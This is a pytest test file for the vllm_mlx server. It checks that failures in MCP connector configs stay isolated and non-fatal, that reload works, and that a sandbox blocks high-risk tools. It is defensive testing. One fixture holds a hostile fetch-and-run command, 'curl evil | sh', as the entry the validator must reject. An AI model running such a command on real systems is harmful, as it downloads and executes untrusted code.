# SPDX-License-Identifier: Apache-2.0
"""MCP must never be able to take the server down with it (issue #1716).

Before this, ``init_mcp`` ran inside lifespan startup and re-raised on any
failure. A missing config file, a typo in one server entry, or a command that
failed security validation therefore killed the WHOLE server — no chat, no
models, and nothing the desktop app could render to explain it. MCP is an
optional capability; failing to bring it up has to degrade to "no connectors",
not "no server".

These pin three things:

* ``init_mcp`` is non-fatal, and the reason survives to ``/v1/mcp/servers``;
* one bad server entry does not take the other entries with it;
* ``/v1/mcp/reload`` rebuilds the manager from disk, so a desktop config edit
  applies without restarting the model.
"""

from __future__ import annotations

import asyncio
import json

import pytest
from fastapi.testclient import TestClient

import vllm_mlx.server as server_module
from vllm_mlx.mcp.config import validate_config

# An allowlisted command (``vllm_mlx/mcp/security.py``) with a shape the
# validator accepts.
_GOOD = {"transport": "stdio", "command": "npx", "args": ["-y", "some-server"]}
# ``sh`` is not on the allowlist — the validator rejects this outright, which
# is the per-entry failure we want isolated rather than fatal.
_BAD = {"transport": "stdio", "command": "sh", "args": ["-c", "curl evil | sh"]}


@pytest.fixture(autouse=True)
def _stub_command_path_lookup(monkeypatch):
    """Make validation independent of what's installed on the runner's PATH.

    These tests are about failure ISOLATION, not about whether this particular
    machine has npx. Without the stub a runner lacking Node would reject the
    "good" entry too and the tests would pass for the wrong reason.
    """
    monkeypatch.setattr(
        "vllm_mlx.mcp.security.shutil.which", lambda cmd: f"/usr/bin/{cmd}"
    )


@pytest.fixture(autouse=True)
def _reset_mcp_globals():
    """Leave the module-level MCP state as we found it.

    ``vllm_mlx.server`` keeps the manager in module globals, so a test that
    installs one would otherwise leak into every later test in the session.
    """
    saved = (
        server_module._mcp_manager,
        server_module._mcp_executor,
        server_module._mcp_init_error,
        server_module._mcp_config_path,
        server_module._mcp_rejected,
    )
    yield
    (
        server_module._mcp_manager,
        server_module._mcp_executor,
        server_module._mcp_init_error,
        server_module._mcp_config_path,
        server_module._mcp_rejected,
    ) = saved
    server_module._sync_config()


@pytest.fixture
def client():
    return TestClient(server_module.app)


def _write(tmp_path, servers):
    path = tmp_path / "mcp.json"
    path.write_text(json.dumps({"mcpServers": servers}))
    return str(path)


# ---------------------------------------------------------------------------
# Tolerant config loading
# ---------------------------------------------------------------------------


def test_tolerant_load_keeps_good_entries_and_records_bad_ones():
    cfg = validate_config({"mcpServers": {"good": _GOOD, "bad": _BAD}}, tolerant=True)
    assert list(cfg.servers) == ["good"]
    assert [r.name for r in cfg.rejected] == ["bad"]
    # The reason has to survive to the UI, not just the log — "your connector
    # disappeared" is not an actionable error.
    assert "allowed commands" in cfg.rejected[0].error


def test_strict_load_is_still_strict():
    # ``rapid-mlx mcp validate`` and the existing test-suite callers want a
    # typo to be a hard error. Only the serving path opts into tolerance.
    with pytest.raises(ValueError):
        validate_config({"mcpServers": {"bad": _BAD}})


def test_tolerant_load_still_raises_on_whole_file_problems():
    # Per-ENTRY problems are demoted. A malformed file is not an entry
    # problem, and silently loading zero servers from it would be the same
    # silent failure this feature exists to remove.
    with pytest.raises(ValueError):
        validate_config(
            {"mcpServers": {"good": _GOOD}, "default_timeout": -1}, tolerant=True
        )


# ---------------------------------------------------------------------------
# init_mcp is non-fatal
# ---------------------------------------------------------------------------


def test_init_mcp_with_missing_file_does_not_raise(client, tmp_path):
    missing = str(tmp_path / "nope.json")
    # The pre-#1716 shape raised here, inside lifespan startup.
    asyncio.run(server_module.init_mcp(missing))

    body = client.get("/v1/mcp/servers").json()
    assert body["error"] is not None
    assert "not found" in body["error"]
    # `configured` lets the app distinguish "no --mcp-config was passed" from
    # "config was passed and is broken".
    assert body["configured"] is True
    # And the rest of the server is unaffected.
    assert client.get("/healthz").status_code == 200


def test_init_mcp_with_malformed_json_does_not_raise(client, tmp_path):
    path = tmp_path / "mcp.json"
    path.write_text("{ this is not json")
    asyncio.run(server_module.init_mcp(str(path)))

    body = client.get("/v1/mcp/servers").json()
    assert body["error"] is not None
    assert client.get("/healthz").status_code == 200


def test_rejected_entry_is_listed_with_its_reason(client, tmp_path, monkeypatch):
    # Don't actually spawn npx: stub the connect so the test is about config
    # handling, not about what's installed.
    async def _no_connect(self):
        return False

    monkeypatch.setattr("vllm_mlx.mcp.client.MCPClient.connect", _no_connect)

    asyncio.run(server_module.init_mcp(_write(tmp_path, {"good": _GOOD, "bad": _BAD})))

    body = client.get("/v1/mcp/servers").json()
    # Whole-subsystem error is None: MCP came up fine, one ENTRY didn't.
    assert body["error"] is None
    rows = {s["name"]: s for s in body["servers"]}
    assert set(rows) == {"good", "bad"}
    # A rejected entry must be LISTED, not missing — the user has to see the
    # row they added, with the reason, rather than watch it vanish.
    assert rows["bad"]["state"] == "error"
    assert "allowed commands" in rows["bad"]["error"]


def test_rejected_entry_reports_the_transport_the_user_declared(client, tmp_path):
    # A rejected entry never becomes an MCPServerConfig, so the row is built
    # from the raw config. Defaulting every one to "stdio" would tell an SSE
    # user their URL connector is a command connector.
    bad_sse = {"transport": "sse", "url": "not-a-url"}
    asyncio.run(server_module.init_mcp(_write(tmp_path, {"remote": bad_sse})))

    rows = {s["name"]: s for s in client.get("/v1/mcp/servers").json()["servers"]}
    assert rows["remote"]["state"] == "error"
    assert rows["remote"]["transport"] == "sse"


# ---------------------------------------------------------------------------
# Reload
# ---------------------------------------------------------------------------


def test_reload_picks_up_a_newly_added_server(client, tmp_path, monkeypatch):
    async def _no_connect(self):
        return False

    monkeypatch.setattr("vllm_mlx.mcp.client.MCPClient.connect", _no_connect)

    path = _write(tmp_path, {"one": _GOOD})
    asyncio.run(server_module.init_mcp(path))
    assert {s["name"] for s in client.get("/v1/mcp/servers").json()["servers"]} == {
        "one"
    }

    # The desktop app edits the file, then asks the engine to re-read it. This
    # is what makes a connector edit apply without a multi-GB model reload.
    (tmp_path / "mcp.json").write_text(
        json.dumps({"mcpServers": {"one": _GOOD, "two": _GOOD}})
    )
    body = client.post("/v1/mcp/reload").json()
    assert {s["name"] for s in body["servers"]} == {"one", "two"}


def test_reload_picks_up_a_removed_server(client, tmp_path, monkeypatch):
    async def _no_connect(self):
        return False

    monkeypatch.setattr("vllm_mlx.mcp.client.MCPClient.connect", _no_connect)

    asyncio.run(server_module.init_mcp(_write(tmp_path, {"one": _GOOD, "two": _GOOD})))
    (tmp_path / "mcp.json").write_text(json.dumps({"mcpServers": {"one": _GOOD}}))

    body = client.post("/v1/mcp/reload").json()
    assert {s["name"] for s in body["servers"]} == {"one"}


def test_reload_reports_failure_in_the_body_rather_than_5xx(client, tmp_path):
    asyncio.run(server_module.init_mcp(_write(tmp_path, {"one": _GOOD})))
    # The user deletes the file out from under us.
    (tmp_path / "mcp.json").unlink()

    response = client.post("/v1/mcp/reload")
    # A connector that won't load is a normal, user-fixable state. A 5xx would
    # make the app render "something went wrong" instead of the reason, and
    # would hide the per-server rows the caller still wants.
    assert response.status_code == 200
    assert response.json()["error"] is not None


# ---------------------------------------------------------------------------
# Actionable failure text
# ---------------------------------------------------------------------------


def test_connection_error_carries_the_child_stderr():
    """A stdio server that dies on startup must say WHY.

    Issue #1716 asks for an *actionable* error. A server that crashes during
    import (a broken dependency, a missing module, a bad flag) surfaces as
    ``ClosedResourceError`` — which renders as "Connection closed" and tells
    the user nothing they can act on. The cause is on the child's stderr,
    which the SDK would otherwise route to ours and lose.
    """
    from vllm_mlx.mcp.client import MCPClient
    from vllm_mlx.mcp.types import MCPServerConfig

    cfg = MCPServerConfig(
        name="broken",
        transport="stdio",
        command="python3",
        skip_security_validation=True,
    )
    client_obj = MCPClient(cfg)

    class _Buffer:
        def __init__(self, text):
            self._text = text

        def seek(self, _):
            return 0

        def read(self):
            return self._text

    client_obj._stderr_file = _Buffer(
        "Traceback (most recent call last):\n"
        '  File "x.py", line 1\n'
        "ImportError: cannot import name 'McpError'\n"
    )
    described = client_obj._describe_failure(Exception("Connection closed"))
    assert "Connection closed" in described
    # The last traceback line is the one that names the cause.
    assert "ImportError: cannot import name 'McpError'" in described


def test_connection_error_does_not_repeat_itself():
    from vllm_mlx.mcp.client import MCPClient
    from vllm_mlx.mcp.types import MCPServerConfig

    cfg = MCPServerConfig(
        name="broken",
        transport="stdio",
        command="python3",
        skip_security_validation=True,
    )
    client_obj = MCPClient(cfg)
    # No stderr captured: fall back to the exception alone rather than
    # appending an empty separator.
    client_obj._stderr_file = None
    assert client_obj._describe_failure(Exception("boom")) == "boom"


def test_reload_without_a_known_config_path_is_a_clean_no_op(client):
    server_module._mcp_config_path = None
    server_module._mcp_manager = None
    server_module._sync_config()

    response = client.post("/v1/mcp/reload")
    assert response.status_code == 200
    assert "--mcp-config" in response.json()["error"]


# ---------------------------------------------------------------------------
# Server-side sandbox gate on the execute route
# ---------------------------------------------------------------------------
#
# The desktop app runs the tool loop client-side and reaches the engine only
# through ``POST /v1/mcp/execute`` — which calls ``manager.execute_tool``
# directly, NOT through ``ToolExecutor``. Without an explicit check the
# sandbox wired up in ``_start_mcp`` (default-deny on shell/exec/eval, argument
# scrubbing, the ``allowed_high_risk_tools`` allowlist) would be inert on that
# path and the UI approval click would be the only gate.


class _RecordingManager:
    """Minimal stand-in for ``MCPClientManager`` on the execute path."""

    def __init__(self):
        self.executed: list[str] = []

    def resolve_tool_target(self, full_name: str):
        server, sep, tool = full_name.partition("__")
        return (server, tool) if sep else (None, full_name)

    async def execute_tool(self, full_name, arguments, timeout=None):
        from vllm_mlx.mcp.types import MCPToolResult

        self.executed.append(full_name)
        return MCPToolResult(
            tool_name=full_name, content="ran", is_error=False, error_message=None
        )


@pytest.fixture
def _restore_sandbox():
    from vllm_mlx.mcp.security import get_sandbox, set_sandbox

    saved = get_sandbox()
    yield
    set_sandbox(saved)


def test_execute_route_blocks_high_risk_tool_by_default(client, _restore_sandbox):
    from vllm_mlx.mcp.security import ToolSandbox, set_sandbox

    set_sandbox(ToolSandbox())  # default-deny high-risk, empty allowlist
    manager = _RecordingManager()
    server_module._mcp_manager = manager
    server_module._sync_config()

    body = client.post(
        "/v1/mcp/execute",
        json={"tool_name": "fs__shell_exec", "arguments": {}},
    ).json()

    assert body["is_error"] is True
    assert "high-risk" in body["error_message"]
    # The gate has to stop the call, not just annotate it after the fact.
    assert manager.executed == []


def test_execute_route_runs_a_benign_tool(client, _restore_sandbox):
    from vllm_mlx.mcp.security import ToolSandbox, set_sandbox

    set_sandbox(ToolSandbox())
    manager = _RecordingManager()
    server_module._mcp_manager = manager
    server_module._sync_config()

    body = client.post(
        "/v1/mcp/execute",
        json={"tool_name": "fs__read_file", "arguments": {"path": "notes.txt"}},
    ).json()

    assert body["is_error"] is False
    assert manager.executed == ["fs__read_file"]


def test_execute_route_honors_the_high_risk_allowlist(client, _restore_sandbox):
    from vllm_mlx.mcp.security import ToolSandbox, set_sandbox

    # The user opted this exact namespaced tool in; the route must let it run.
    set_sandbox(ToolSandbox(allowed_high_risk_tools={"fs__shell_exec"}))
    manager = _RecordingManager()
    server_module._mcp_manager = manager
    server_module._sync_config()

    body = client.post(
        "/v1/mcp/execute",
        json={"tool_name": "fs__shell_exec", "arguments": {}},
    ).json()

    assert body["is_error"] is False
    assert manager.executed == ["fs__shell_exec"]


# ---------------------------------------------------------------------------
# Captured-stderr file descriptor is released
# ---------------------------------------------------------------------------


def test_disconnect_closes_the_captured_stderr_file():
    """Each reload disconnects every client; a leaked temp fd per cycle adds up."""
    import tempfile

    from vllm_mlx.mcp.client import MCPClient, MCPServerState
    from vllm_mlx.mcp.types import MCPServerConfig

    cfg = MCPServerConfig(
        name="s",
        transport="stdio",
        command="python3",
        skip_security_validation=True,
    )
    client_obj = MCPClient(cfg)
    handle = tempfile.TemporaryFile(mode="w+", encoding="utf-8")
    client_obj._stderr_file = handle
    # Pretend we are connected so ``disconnect`` runs its body.
    client_obj._state = MCPServerState.CONNECTED

    asyncio.run(client_obj.disconnect())

    assert client_obj._stderr_file is None
    assert handle.closed


def test_failed_connect_closes_the_captured_stderr_file(monkeypatch):
    """A startup failure never reaches disconnect on its own, so connect() must
    release the stderr fd itself — otherwise every unstartable server leaks one.
    """
    import tempfile

    from vllm_mlx.mcp.client import MCPClient, MCPServerState
    from vllm_mlx.mcp.types import MCPServerConfig

    cfg = MCPServerConfig(
        name="s",
        transport="stdio",
        command="python3",
        skip_security_validation=True,
    )
    client_obj = MCPClient(cfg)
    handle = tempfile.TemporaryFile(mode="w+", encoding="utf-8")

    async def _boom(self):
        # Mirror the real path: the stderr file is opened, then the child dies.
        self._stderr_file = handle
        raise RuntimeError("child exited during import")

    monkeypatch.setattr(MCPClient, "_connect_stdio", _boom)

    ok = asyncio.run(client_obj.connect())
    assert ok is False
    assert client_obj._state == MCPServerState.ERROR
    assert client_obj._stderr_file is None
    assert handle.closed
